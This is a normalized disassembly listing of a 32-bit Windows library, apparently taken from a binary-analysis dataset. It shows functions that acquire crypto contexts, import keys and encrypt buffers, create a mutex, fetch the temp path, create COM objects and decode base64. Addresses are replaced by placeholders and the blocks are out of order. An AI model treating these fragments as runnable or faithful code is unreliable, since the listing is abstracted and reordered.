cmp [ esi + 0x5 ] al
jne r-xdata
mov ecx esi
call sub_1004cd62
mov ecx esi
call sub_10017b01
push [ ebp - 0x58 ]
mov ecx esi
call sub_100161f2
test al al
je r-xdata
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
mov [ edi ] 0x70
mov ecx esi
inc edi
call sub_10017b01
push [ ebp - 0x58 ]
mov ecx esi
mov [ ebp - 0x49 ] 0x0
xor ebx ebx
call sub_100161f2
test al al
jne r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
inc edx
jmp r-xdata
cmp cl [ eax ]
jl r-xdata
lea eax [ ebp - 0x2c ]
mov [ ebp - 0x51 ] 0x1
mov [ ebp - 0x51 ] 0x1
inc ebx
jmp r-xdata
push 0x0
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_10050f80
inc ebx
inc [ eax + ebx ]
jmp r-xdata
lea eax [ ebp - 0x2c ]
push [ ebp - 0x58 ]
mov ecx esi
call sub_100161f2
test al al
jne r-xdata
cmp [ esi + 0x4 ] bl
jne r-xdata
cmp [ esi + 0x5 ] 0x50
jne r-xdata
mov ecx esi
call sub_1004cd62
push [ ebp - 0x58 ]
mov ecx esi
call sub_100161f2
test al al
je r-xdata
cmp [ esi + 0x4 ] bl
jne r-xdata
cmp [ esi + 0x5 ] 0x2b
jne r-xdata
mov ecx esi
call sub_1004cd62
cmp [ esi + 0x4 ] 0x0
jne r-xdata
cmp [ esi + 0x5 ] 0x30
jne r-xdata
mov ecx esi
call sub_1004cd62
cmp [ esi + 0x4 ] bl
jne r-xdata
mov [ edi ] 0x2b
jmp r-xdata
cmp [ esi + 0x5 ] 0x30
jl r-xdata
mov ecx esi
call sub_1004cd62
cmp [ ebp - 0x49 ] bl
je r-xdata
mov ecx esi
mov [ ebp - 0x49 ] 0x1
call sub_10017b01
push [ ebp - 0x58 ]
mov ecx esi
call sub_100161f2
test al al
je r-xdata
cmp [ esi + 0x5 ] 0x2d
jne r-xdata
mov ecx esi
call sub_1004cd62
mov ecx esi
inc edi
call sub_10017b01
cmp [ esi + 0x4 ] 0x0
jne r-xdata
mov [ edi ] 0x30
inc edi
jmp r-xdata
mov [ edi ] 0x2d
cmp [ esi + 0x5 ] 0x39
jg r-xdata
mov ecx esi
call sub_1004cd62
cmp ebx 0x8
jge r-xdata
mov ecx esi
mov [ ebp - 0x49 ] 0x1
call sub_10017b01
cmp [ esi + 0x4 ] 0x0
jne r-xdata
mov al [ esi + 0x5 ]
mov [ edi ] al
inc edi
inc ebx
mov ecx esi
call sub_1004cd62
sub_1003c255
push ebp
mov ebp esp
push ecx
push ecx
push ebx
mov ebx [ ebp + 0xc ]
mov eax [ ebx ]
push esi
push edi
xor edi edi
push edi
xor esi esi
inc esi
push esi
push r--data
mov [ ebp + 0xc ] eax
push edi
lea eax [ ebp - 0x8 ]
push eax
mov [ ebp - 0x8 ] edi
mov [ ebp - 0x4 ] edi
call [ CryptAcquireContextW@IAT ]
test eax eax
jne r-xdata
lea eax [ ebp - 0x4 ]
push eax
push edi
push edi
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp - 0x8 ]
call [ CryptImportKey@IAT ]
test eax eax
jne r-xdata
call [ GetLastError@IAT ]
cmp eax 0x80090016
jne r-xdata
push [ ebx ]
lea eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push [ eax ]
push edi
push esi
mov esi [ CryptEncrypt@IAT ]
push edi
push [ ebp - 0x4 ]
call esi
test eax eax
jne r-xdata
push 0x2
mov eax esi
lea eax [ ebp - 0x8 ]
push eax
call sub_1000eb9b
jmp r-xdata
push [ ebp - 0x4 ]
call [ CryptDestroyKey@IAT ]
xor esi esi
jmp r-xdata
call [ GetLastError@IAT ]
cmp eax 0xea
jne r-xdata
pop edi
mov eax esi
pop esi
pop ebx
leave
retn 0x10
cmp eax edi
je r-xdata
push edi
push [ ebp - 0x8 ]
call [ CryptReleaseContext@IAT ]
jmp r-xdata
push [ ebp - 0x4 ]
call [ CryptDestroyKey@IAT ]
push 0x3
jmp r-xdata
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push 0x8
call [ GetProcessHeap@IAT ]
push eax
call [ HeapReAlloc@IAT ]
push [ ebp + 0xc ]
push ebx
push [ eax ]
push edi
push 0x1
push edi
push [ ebp - 0x4 ]
call esi
test eax eax
jne r-xdata
pop esi
push [ ebp - 0x4 ]
call [ CryptDestroyKey@IAT ]
push 0x4
jmp r-xdata
sub_1003c360
push ebp
mov ebp esp
push 0xffffffff
push sub_10080f61
mov eax [ fs : 0x0 ]
push eax
sub esp 0x60
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
xor ebx ebx
mov [ ebp - 0x58 ] ecx
mov ecx [ ebp + 0x10 ]
mov [ edi ] bl
mov [ ebp - 0x50 ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0x6c ] edi
mov [ ebp - 0x5c ] edx
mov [ ebp - 0x54 ] ecx
mov [ edi + 0x4 ] ebx
mov [ edi + 0x8 ] ebx
mov [ edi + 0xc ] ebx
mov [ ebp - 0x4 ] ebx
mov esi 0x7
xor edx edx
mov [ edi + 0x40 ] esi
mov [ edi + 0x3c ] ebx
mov [ edi + 0x2c ] dx
xor ecx ecx
mov [ edi + 0x5c ] esi
mov [ edi + 0x58 ] ebx
mov [ edi + 0x48 ] cx
mov [ edi + 0x78 ] esi
mov [ edi + 0x74 ] ebx
mov [ edi + 0x64 ] dx
push 0xffffffff
lea ecx [ edi + 0x80 ]
mov [ ebp - 0x4 ] 0x3
push ebx
mov [ ecx + 0x14 ] esi
mov [ ecx + 0x10 ] ebx
push eax
mov [ ecx ] dx
call sub_1001c310
mov [ edi + 0xb4 ] 0xf
mov [ edi + 0xb0 ] ebx
mov [ edi + 0xa0 ] bl
mov [ edi + 0xbc ] ebx
mov [ edi + 0xc0 ] 0x3
mov [ edi + 0xc4 ] ebx
mov [ edi + 0xc8 ] ebx
mov [ edi + 0xcc ] ebx
mov [ ebp - 0x4 ] 0x6
push 0x18
mov [ edi + 0xdc ] ebx
call sub_1005ac7e
add esp 0x4
cmp eax ebx
je r-xdata
lea eax [ ebp - 0x4c ]
push eax
lea ecx [ ebp - 0x68 ]
mov [ ebp - 0x4c ] ebx
call sub_10052185
push r--data
lea ecx [ ebp - 0x68 ]
push ecx
mov [ ebp - 0x68 ] r--data
call sub_1002050e
int3
mov [ edi + 0xd8 ] eax
mov [ eax ] eax
mov eax [ edi + 0xd8 ]
mov [ eax + 0x4 ] eax
mov eax [ edi + 0xd8 ]
mov [ eax + 0x8 ] eax
mov eax [ edi + 0xd8 ]
mov [ eax + 0x14 ] 0x1
mov ecx [ edi + 0xd8 ]
mov [ ecx + 0x15 ] 0x1
xor edx edx
mov [ edi + 0xfc ] esi
mov [ edi + 0xf8 ] ebx
mov [ edi + 0xe8 ] dx
fldz
fst [ edi + 0x114 ]
mov [ edi + 0x104 ] ebx
fstp [ edi + 0x118 ]
mov [ edi + 0x108 ] 0x1
mov [ edi + 0x10c ] ebx
mov [ edi + 0x110 ] ebx
xor eax eax
mov [ edi + 0x130 ] esi
mov [ edi + 0x12c ] ebx
mov [ edi + 0x11c ] ax
mov [ ebp - 0x4 ] 0x9
mov [ ebp - 0x4c ] ebx
cmp [ ebp - 0x50 ] ebx
je r-xdata
mov eax edi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn 0xc
mov edx [ ebp - 0x50 ]
lea esi [ ebp - 0x4c ]
call sub_1006b8f0
cmp eax ebx
jl r-xdata
mov edx [ ebp - 0x4c ]
mov eax [ ebp - 0x50 ]
xor ecx ecx
push edx
mov [ ebp - 0x2c ] cx
push eax
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x18 ] 0x7
mov [ ebp - 0x1c ] ebx
call sub_1005e3c0
mov [ ebp - 0x4 ] 0xa
cmp [ ebp - 0x18 ] 0x8
mov eax [ ebp - 0x2c ]
jae r-xdata
mov ecx [ ebp - 0x1c ]
push eax
lea esi [ ebp - 0x48 ]
call sub_10036f20
add esp 0x4
push eax
lea ecx [ edi + 0xa0 ]
mov [ ebp - 0x4 ] 0xb
call sub_100172f0
mov [ ebp - 0x4 ] 0xa
cmp [ ebp - 0x34 ] 0x10
jb r-xdata
lea eax [ ebp - 0x2c ]
lea edx [ edi + 0xe4 ]
push edx
call sub_1000b569
add esp 0x4
lea eax [ edi + 0x14 ]
push eax
call [ InitializeCriticalSection@IAT ]
mov edx [ ebp - 0x58 ]
cmp edx ebx
je r-xdata
mov ecx [ ebp - 0x48 ]
push ecx
call sub_10065045
add esp 0x4
push ebx
push ebx
push ebx
call [ CreateMutexW@IAT ]
mov [ edi + 0x110 ] eax
cmp eax ebx
jne r-xdata
mov eax edx
lea esi [ eax + 0x2 ]
jmp r-xdata
cmp [ ebp - 0x18 ] 0x8
mov [ edi ] 0x1
jb r-xdata
cmp [ ebp - 0x18 ] 0x8
jb r-xdata
mov cx [ eax ]
add eax 0x2
cmp cx bx
jne r-xdata
mov edx [ ebp - 0x2c ]
push edx
mov ecx [ ebp - 0x2c ]
push ecx
jmp r-xdata
sub eax esi
sar eax 0x1
push eax
push edx
lea ecx [ edi + 0x2c ]
call sub_1005e3c0
mov edx [ ebp - 0x5c ]
cmp edx ebx
je r-xdata
call sub_10065045
add esp 0x4
mov eax edx
lea esi [ eax + 0x2 ]
mov cx [ eax ]
add eax 0x2
cmp cx bx
jne r-xdata
sub eax esi
sar eax 0x1
push eax
push edx
lea ecx [ edi + 0x48 ]
call sub_1005e3c0
mov edx [ ebp - 0x54 ]
cmp edx ebx
je r-xdata
lea eax [ edi + 0x64 ]
push eax
call sub_10049460
sub_1003c650
push ebp
mov ebp esp
push 0xffffffff
push sub_1008161c
mov eax [ fs : 0x0 ]
push eax
sub esp 0xd4
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov ebx ecx
cmp [ ebx + 0x2e4 ] 0x0
mov [ ebp - 0xe0 ] ebx
jne r-xdata
lea edx [ ebp - 0x20 ]
mov eax 0xd
call sub_100328b0
lea edx [ ebp - 0x34 ]
mov eax 0x67
call sub_100328b0
xor edi edi
mov ecx edx
cmp [ ebx + 0xb0 ] edi
jne r-xdata
mov eax 0x64
jmp r-xdata
xor eax eax
mov [ ebp - 0x50 ] ax
mov eax ecx
mov [ ebp - 0x3c ] 0x7
mov [ ebp - 0x40 ] edi
lea esi [ eax + 0x2 ]
lea ecx [ ebp - 0x20 ]
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn
mov dx [ eax ]
add eax 0x2
cmp dx di
jne r-xdata
sub eax esi
sar eax 0x1
push eax
push ecx
lea ecx [ ebp - 0x50 ]
call sub_1005e3c0
mov [ ebp - 0x4 ] edi
movzx eax [ ebx + 0x20 ]
cdq
push edx
push eax
lea esi [ ebp - 0xdc ]
call sub_10065740
mov edi eax
lea ecx [ ebp - 0x50 ]
push ecx
lea edx [ ebp - 0xc0 ]
add ebx 0x4
push edx
mov [ ebp - 0x4 ] 0x1
call sub_10057f30
push eax
mov edx r--data
lea esi [ ebp - 0x88 ]
mov [ ebp - 0x4 ] 0x2
call sub_10045750
add esp 0x14
mov ecx eax
mov eax edi
lea edi [ ebp - 0xa4 ]
mov [ ebp - 0x4 ] 0x3
call sub_10021620
mov ecx eax
mov edi [ ebp - 0xe0 ]
lea eax [ edi + 0x24 ]
lea esi [ ebp - 0x6c ]
mov [ ebp - 0x4 ] 0x4
call sub_10024360
push eax
lea ecx [ edi + 0x2c4 ]
mov [ ebp - 0x4 ] 0x5
call sub_10051390
cmp [ ebp - 0x58 ] 0x8
jb r-xdata
xor ebx ebx
xor ecx ecx
cmp [ ebp - 0x90 ] 0x8
mov esi 0x7
mov [ ebp - 0x58 ] esi
mov [ ebp - 0x5c ] ebx
mov [ ebp - 0x6c ] cx
jb r-xdata
mov eax [ ebp - 0x6c ]
push eax
call sub_10065045
add esp 0x4
xor eax eax
cmp [ ebp - 0x74 ] 0x8
mov [ ebp - 0x90 ] esi
mov [ ebp - 0x94 ] ebx
mov [ ebp - 0xa4 ] ax
jb r-xdata
mov edx [ ebp - 0xa4 ]
push edx
call sub_10065045
add esp 0x4
xor edx edx
cmp [ ebp - 0xac ] 0x8
mov [ ebp - 0x74 ] esi
mov [ ebp - 0x78 ] ebx
mov [ ebp - 0x88 ] dx
jb r-xdata
mov ecx [ ebp - 0x88 ]
push ecx
call sub_10065045
add esp 0x4
xor ecx ecx
cmp [ ebp - 0xc8 ] 0x8
mov [ ebp - 0xac ] esi
mov [ ebp - 0xb0 ] ebx
mov [ ebp - 0xc0 ] cx
jb r-xdata
mov eax [ ebp - 0xc0 ]
push eax
call sub_10065045
add esp 0x4
lea esi [ edi + 0xb8 ]
push esi
push 0x104
call [ GetTempPathW@IAT ]
test eax eax
jne r-xdata
mov edx [ ebp - 0xdc ]
push edx
call sub_10065045
add esp 0x4
cmp [ ebp - 0x3c ] 0x8
jb r-xdata
mov edi r--data
mov edx 0x104
mov eax esi
sub edi esi
nop
xor eax eax
mov eax [ ebp - 0x50 ]
push eax
call sub_10065045
add esp 0x4
cmp edx ebx
jne r-xdata
movzx ecx [ edi + eax ]
cmp cx bx
je r-xdata
xor edx edx
mov [ eax ] dx
sub eax 0x2
mov [ eax ] cx
add eax 0x2
dec edx
jne r-xdata
lea ecx [ edx + 0x7ffffefa ]
test ecx ecx
je r-xdata
jmp r-xdata
sub_1003c8aa
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x10 ]
mov ecx [ ebp + 0xc ]
and eax 0xfff7ffff
and ecx eax
push esi
mov esi [ ebp + 0x8 ]
test ecx 0xfcf0fce0
je r-xdata
push eax
push [ ebp + 0xc ]
test esi esi
je r-xdata
test esi esi
je r-xdata
call sub_100633fe
call sub_100633fe
mov [ esi ] eax
jmp r-xdata
call sub_10012991
push 0x16
pop esi
mov [ eax ] esi
call sub_1002788e
mov eax esi
jmp r-xdata
push 0x0
push 0x0
call sub_100633fe
pop ecx
pop ecx
mov [ esi ] eax
pop ecx
pop ecx
xor eax eax
pop esi
pop ebp
retn
sub_1003c910
push ebp
mov ebp esp
push 0xffffffff
push sub_10080b50
mov eax [ fs : 0x0 ]
push eax
sub esp 0x3c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
lea esi [ ebp - 0x2c ]
mov edx ebx
call sub_1005d560
push eax
mov ecx rw-data
mov [ ebp - 0x4 ] 0x0
call sub_10051390
mov [ ebp - 0x4 ] 0xffffffff
cmp [ ebp - 0x18 ] 0x8
jb r-xdata
mov eax [ rw-data ]
push r--data
xor edi edi
mov ecx rw-data
call sub_1005e510
test eax eax
jne r-xdata
mov eax [ ebp - 0x2c ]
push eax
call sub_10065045
add esp 0x4
lea esi [ ebp - 0x2c ]
mov edx ebx
call sub_100093d0
push eax
mov ecx rw-data
mov [ ebp - 0x4 ] 0x1
call sub_10051390
mov [ ebp - 0x4 ] 0xffffffff
cmp [ ebp - 0x18 ] 0x8
jb r-xdata
lea eax [ edi + 0x1 ]
jmp r-xdata
mov eax [ rw-data ]
push r--data
xor edi edi
mov ecx rw-data
call sub_1005e510
test eax eax
jne r-xdata
mov ecx [ ebp - 0x2c ]
push ecx
call sub_10065045
add esp 0x4
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn
lea esi [ ebp - 0x2c ]
mov edx ebx
call sub_1003eb90
push eax
mov ecx rw-data
mov [ ebp - 0x4 ] 0x2
call sub_10051390
mov [ ebp - 0x4 ] 0xffffffff
cmp [ ebp - 0x18 ] 0x8
jb r-xdata
lea eax [ edi + 0x2 ]
jmp r-xdata
mov eax [ rw-data ]
push r--data
xor edi edi
mov ecx rw-data
call sub_1005e510
test eax eax
jne r-xdata
mov edx [ ebp - 0x2c ]
push edx
call sub_10065045
add esp 0x4
lea esi [ ebp - 0x48 ]
mov edx ebx
call sub_100372e0
push eax
mov ecx rw-data
mov [ ebp - 0x4 ] 0x3
call sub_10051390
cmp [ ebp - 0x34 ] 0x8
jb r-xdata
lea eax [ edi + 0x3 ]
jmp r-xdata
xor eax eax
mov eax [ ebp - 0x48 ]
push eax
call sub_10065045
add esp 0x4
sub_1003ca90
push ebp
mov ebp esp
sub esp 0x34
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebx
mov [ ebp - 0x34 ] eax
add eax 0x1c
push eax
push r--data
push 0x1
push 0x0
push r--data
mov ebx edx
mov [ ebp - 0x2c ] ecx
mov [ ebp - 0x30 ] eax
call [ CoCreateInstance@IAT ]
test eax eax
jns r-xdata
push esi
push edi
push r--data
mov [ ebp - 0x28 ] 0x1
xor edi edi
call [ lstrlenA@IAT ]
mov ecx r--data
mov esi ebx
cmp eax 0x4
jb r-xdata
xor eax eax
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn 0x4
test eax eax
je r-xdata
mov edx [ esi ]
cmp edx [ ecx ]
jne r-xdata
mov ecx [ ebp - 0x34 ]
push r--data
mov [ ecx + 0x140 ] 0x1
call [ lstrlenA@IAT ]
mov edi eax
mov dl [ ecx ]
cmp dl [ esi ]
jne r-xdata
mov eax [ ebp - 0x2c ]
sub eax edi
push eax
add ebx edi
push ebx
call [ SysAllocStringByteLen@IAT ]
mov edx [ ebp - 0x30 ]
mov esi eax
mov eax [ edx ]
mov ecx [ eax ]
lea edx [ ebp - 0x28 ]
push edx
push esi
push eax
mov eax [ ecx + 0x104 ]
call eax
cmp [ ebp - 0x28 ] 0x0
jne r-xdata
sub eax 0x4
add ecx 0x4
add esi 0x4
cmp eax 0x4
jae r-xdata
push esi
call [ SysFreeString@IAT ]
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
mov eax 0x1
pop ebx
call sub_1004c3b6
mov esp ebp
pop ebp
retn 0x4
xor eax eax
cmp eax 0x1
jbe r-xdata
inc eax
cmp eax 0xf
jb r-xdata
push esi
call [ SysFreeString@IAT ]
pop edi
pop esi
xor eax eax
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn 0x4
mov dl [ ecx + 0x1 ]
cmp dl [ esi + 0x1 ]
jne r-xdata
cmp eax 0x2
jbe r-xdata
mov al [ ecx + 0x2 ]
cmp al [ esi + 0x2 ]
jne r-xdata
sub_1003cbd0
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
push esi
push edi
mov esi ecx
test eax eax
je r-xdata
mov eax [ esi + 0x10 ]
push ebx
mov ebx [ ebp + 0x8 ]
cmp eax ebx
jae r-xdata
mov edx [ esi + 0x14 ]
cmp edx 0x10
jb r-xdata
mov ecx [ ebp + 0x10 ]
or edx 0xffffffff
sub edx eax
cmp edx ecx
ja r-xdata
push r--data
call sub_1003b4a6
cmp eax ecx
jb r-xdata
mov ecx [ esi ]
test ecx ecx
je r-xdata
push r--data
call sub_100616c6
cmp edx 0x10
jb r-xdata
pop ebx
pop edi
mov eax esi
pop esi
pop ebp
retn 0xc
lea edi [ eax + ecx ]
cmp edi 0xfffffffe
jbe r-xdata
mov ecx esi
mov ecx [ esi ]
jmp r-xdata
mov ecx [ esi + 0x14 ]
cmp ecx edi
jae r-xdata
push r--data
call sub_100616c6
cmp edx 0x10
jb r-xdata
mov edi [ esi + 0x10 ]
add edi ecx
cmp edi eax
jbe r-xdata
test edi edi
jne r-xdata
push eax
push edi
mov ecx esi
call sub_1004d5e0
test edi edi
je r-xdata
mov ecx esi
mov ecx [ esi ]
jmp r-xdata
mov eax [ esi + 0x14 ]
cmp eax 0x10
jb r-xdata
mov [ esi + 0x10 ] edi
cmp ecx 0x10
jb r-xdata
mov edx [ ebp + 0x10 ]
push edx
sub eax ecx
push eax
mov eax [ ebp + 0x8 ]
push esi
push eax
mov ecx esi
call sub_100196f0
pop edi
pop esi
pop ebp
retn 0xc
mov ecx esi
mov ecx [ esi ]
jmp r-xdata
pop ebx
mov eax esi
pop edi
mov [ eax ] 0x0
pop esi
pop ebp
retn 0xc
mov eax [ esi ]
pop ebx
mov [ eax ] 0x0
pop edi
mov eax esi
pop esi
pop ebp
retn 0xc
mov eax esi
mov eax [ esi ]
jmp r-xdata
cmp eax 0x10
jb r-xdata
mov eax esi
mov eax [ esi ]
jmp r-xdata
mov edx [ esi + 0x10 ]
sub edx ebx
push edx
add eax ebx
add eax [ ebp + 0x10 ]
add ecx ebx
push ecx
push eax
call sub_10077d10
add esp 0xc
cmp [ esi + 0x14 ] 0x10
jb r-xdata
mov eax esi
mov [ eax + edi ] 0x0
mov eax [ esi ]
pop ebx
mov [ eax + edi ] 0x0
pop edi
mov eax esi
pop esi
pop ebp
retn 0xc
mov ecx [ ebp + 0x10 ]
mov edx [ ebp + 0xc ]
push ecx
push edx
add eax ebx
push eax
call sub_10078600
add esp 0xc
cmp [ esi + 0x14 ] 0x10
mov [ esi + 0x10 ] edi
jb r-xdata
sub_1003cd20
push ebp
mov ebp esp
push ecx
mov edx [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x8 ]
xor eax eax
mov [ esi + 0x10 ] eax
mov [ esi + 0x14 ] 0xf
mov [ ebp - 0x4 ] eax
mov [ esi ] al
mov eax [ ebp + 0x10 ]
push eax
push edx
push ecx
mov ecx esi
call sub_100146b0
mov eax esi
pop esi
mov esp ebp
pop ebp
retn 0xc
sub_1003cd60
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
mov esi ecx
mov [ esi ] r--data
mov ecx [ eax + 0x4 ]
mov [ esi + 0x4 ] ecx
mov edx [ eax + 0x8 ]
mov eax edx
mov [ esi + 0x8 ] edx
mov [ esi + 0xc ] 0x0
test eax eax
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
mov ecx [ eax ]
mov edx [ ecx + 0x4 ]
push eax
call edx
sub_1003cdb0
push ebp
mov ebp esp
push ecx
push esi
push edi
mov esi eax
xor ecx ecx
xor edi edi
xor edx edx
test esi esi
je r-xdata
pop edi
xor eax eax
pop esi
mov esp ebp
pop ebp
retn
mov eax esi
sub eax edx
cmp eax 0x2
mov eax [ ebp + 0x10 ]
jb r-xdata
mov al [ edx + eax ]
cmp al 0xa
je r-xdata
cmp [ edx + eax ] 0xd
jne r-xdata
inc edx
cmp edx esi
jb r-xdata
cmp al 0x3d
jne r-xdata
cmp [ edx + eax + 0x1 ] 0xa
je r-xdata
mov [ ebp - 0x4 ] edx
test edi edi
jne r-xdata
cmp al 0x7f
ja r-xdata
inc ecx
cmp ecx 0x2
ja r-xdata
mov eax [ ebp + 0x8 ]
lea ecx [ edi + edi * 2 ]
lea ecx [ ecx + ecx + 0x7 ]
shr ecx 0x3
test eax eax
je r-xdata
pop edi
mov eax 0xffffffd4
pop esi
mov esp ebp
pop ebp
retn
movzx eax al
mov al [ eax + r--data ]
cmp al 0x7f
je r-xdata
mov edx [ ebp + 0xc ]
pop edi
mov [ edx ] ecx
mov eax 0xffffffd6
pop esi
mov esp ebp
pop ebp
retn
mov esi [ ebp + 0xc ]
cmp [ esi ] ecx
jb r-xdata
cmp al 0x40
jae r-xdata
xor ecx ecx
xor edi edi
push ebx
mov ebx 0x3
mov esi eax
test edx edx
je r-xdata
inc edi
test ecx ecx
jne r-xdata
mov ecx [ ebp + 0xc ]
sub esi eax
pop ebx
pop edi
mov [ ecx ] esi
xor eax eax
pop esi
mov esp ebp
pop ebp
retn
mov eax [ ebp + 0x10 ]
mov al [ eax ]
cmp al 0xd
je r-xdata
inc [ ebp + 0x10 ]
dec edx
mov [ ebp - 0x4 ] edx
test edx edx
jne r-xdata
cmp al 0xa
je r-xdata
mov eax [ ebp + 0x8 ]
movzx edx al
mov al [ edx + r--data ]
xor edx edx
cmp al 0x40
sete dl
movzx eax al
and eax 0x3f
shl ecx 0x6
inc edi
sub ebx edx
or ecx eax
cmp edi 0x4
jne r-xdata
mov edx [ ebp - 0x4 ]
xor edi edi
test ebx ebx
je r-xdata
cmp ebx 0x1
jbe r-xdata
mov edx ecx
shr edx 0x10
mov [ esi ] dl
inc esi
mov edx [ ebp - 0x4 ]
cmp ebx 0x2
jbe r-xdata
mov eax ecx
shr eax 0x8
mov [ esi ] al
inc esi
mov [ esi ] cl
inc esi
jmp r-xdata
sub_1003cede
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
and [ ebp - 0x8 ] 0x0
add ecx 0x18
push ecx
lea eax [ ebp - 0x8 ]
push eax
push 0x1
lea eax [ ebp + 0x8 ]
push eax
lea eax [ ebp - 0x4 ]
push eax
call sub_10024496
add esp 0x14
test eax eax
mov eax 0xffff
js r-xdata
leave
retn 0x4
movzx eax [ ebp - 0x4 ]
sub_1003cf14
mov edi edi
push ebp
mov ebp esp
push ecx
push 0x0
lea eax [ ebp - 0x4 ]
push eax
push [ ebp + 0x10 ]
push 0x40
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_1003234f
add esp 0x18
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
leave
retn
or eax 0xffffffff
leave
retn
sub_1003cf41
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
xor edi edi
mov [ ebp - 0x4 ] edi
mov [ ebp - 0x10 ] esi
mov [ ebp - 0xc ] edi
cmp [ esi + 0x18 ] edi
jne r-xdata
push 0x50
push 0x1
call sub_10025450
mov ebx eax
pop ecx
pop ecx
cmp ebx edi
jne r-xdata
cmp [ esi + 0x1c ] edi
jne r-xdata
push 0x4
call sub_10028397
pop ecx
mov [ ebp - 0x8 ] eax
cmp eax edi
jne r-xdata
xor eax eax
inc eax
jmp r-xdata
mov [ ebp - 0x4 ] edi
mov [ ebp - 0x8 ] edi
mov ebx rw-data
jmp r-xdata
mov [ eax ] edi
cmp [ esi + 0x18 ] edi
je r-xdata
push ebx
call sub_10020a90
pop edi
pop esi
pop ebx
leave
retn
mov eax [ esi + 0xb8 ]
cmp eax edi
je r-xdata
push 0x14
pop ecx
mov esi rw-data
mov edi ebx
[ edi ] [ esi ]
push 0x4
call sub_10028397
pop ecx
mov [ ebp - 0x4 ] eax
cmp eax edi
jne r-xdata
mov eax [ esi + 0xb0 ]
cmp eax edi
je r-xdata
push eax
call [ InterlockedDecrement@IAT ]
mov ecx [ ebp - 0x4 ]
mov [ ecx ] eax
mov [ eax ] edi
movzx esi [ esi + 0x38 ]
lea eax [ ebx + 0xc ]
push eax
push 0x15
push esi
lea eax [ ebp - 0x10 ]
push 0x1
push eax
call sub_1002f2f7
mov edi eax
lea eax [ ebx + 0x10 ]
push eax
push 0x14
push esi
lea eax [ ebp - 0x10 ]
push 0x1
push eax
call sub_1002f2f7
or edi eax
lea eax [ ebx + 0x14 ]
push eax
push 0x16
push esi
lea eax [ ebp - 0x10 ]
push 0x1
push eax
call sub_1002f2f7
or edi eax
lea eax [ ebx + 0x18 ]
push eax
push 0x17
push esi
lea eax [ ebp - 0x10 ]
push 0x1
push eax
call sub_1002f2f7
add esp 0x50
or edi eax
lea eax [ ebx + 0x1c ]
push eax
push 0x18
push esi
lea eax [ ebp - 0x10 ]
push 0x1
push eax
call sub_1002f2f7
or edi eax
lea eax [ ebx + 0x20 ]
push eax
push 0x50
push esi
lea eax [ ebp - 0x10 ]
push 0x1
push eax
call sub_1002f2f7
or edi eax
lea eax [ ebx + 0x24 ]
push eax
push 0x51
push esi
lea eax [ ebp - 0x10 ]
push 0x1
push eax
call sub_1002f2f7
or edi eax
lea eax [ ebx + 0x28 ]
push eax
push 0x1a
push esi
lea eax [ ebp - 0x10 ]
push 0x0
push eax
call sub_1002f2f7
add esp 0x50
or edi eax
lea eax [ ebx + 0x29 ]
push eax
push 0x19
push esi
push 0x0
lea eax [ ebp - 0x10 ]
push eax
call sub_1002f2f7
or edi eax
lea eax [ ebx + 0x2a ]
push eax
push 0x54
push esi
lea eax [ ebp - 0x10 ]
push 0x0
push eax
call sub_1002f2f7
or edi eax
lea eax [ ebx + 0x2b ]
push eax
push 0x55
push esi
lea eax [ ebp - 0x10 ]
push 0x0
push eax
call sub_1002f2f7
or edi eax
lea eax [ ebx + 0x2c ]
push eax
push 0x56
push esi
lea eax [ ebp - 0x10 ]
push 0x0
push eax
call sub_1002f2f7
add esp 0x50
or edi eax
lea eax [ ebx + 0x2d ]
push eax
push 0x57
push esi
lea eax [ ebp - 0x10 ]
push 0x0
push eax
call sub_1002f2f7
or edi eax
lea eax [ ebx + 0x2e ]
push eax
push 0x52
push esi
lea eax [ ebp - 0x10 ]
push 0x0
push eax
call sub_1002f2f7
or edi eax
lea eax [ ebx + 0x2f ]
push eax
push 0x53
push esi
lea eax [ ebp - 0x10 ]
push 0x0
push eax
call sub_1002f2f7
or edi eax
lea eax [ ebx + 0x38 ]
push eax
push 0x15
push esi
